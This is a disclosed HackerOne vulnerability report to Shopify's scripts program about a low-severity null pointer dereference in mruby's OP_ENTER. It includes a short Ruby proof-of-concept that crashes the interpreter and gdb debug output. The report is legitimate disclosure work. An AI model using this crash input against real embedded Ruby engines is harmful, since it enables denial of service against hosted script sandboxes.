# Null pointer dereference in OP_ENTER

## Report Details
- **Report ID**: 218233
- **URL**: https://hackerone.com/reports/218233
- **State**: Closed
- **Severity**: low
- **Submitted**: 2017-04-03T01:22:23.604Z
- **Disclosed**: 2017-04-15T14:45:14.601Z

## Reporter
- **Username**: dgaletic
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify-scripts

## Vulnerability Information
PoC
===
The following demonstrates a crash:

    class A
      def foo
      end
    end

    class B < A
      def foo(*args)
        super(*args, &:b)
      end
    end

    B.new.foo

Debug info
==========

The null pointer dereference happens in vm.c:1572 in both mruby and mruby-engine:

    1570│       if (argc < 0) {
    1571│         struct RArray *ary = mrb_ary_ptr(regs[1]);
    1572├>        argv = ary->ptr;

    (gdb) p ary
    $1 = (struct RArray *) 0x0


Test platform
=============
* Linux Mint 17.3 (Cinnamon 64-bit), built with gcc version 4.8.4 (Ubuntu 4.8.4-2ubuntu1~14.04.3

mruby SHA: a14a930c800aa50a191922580d53a2ce09287912
mruby-engine SHA: 09be20e67888b20bebf9b0588bc3cbec7f55325f

Thank you,
Dinko Galetic
Denis Kasak

## Attachments
No attachments
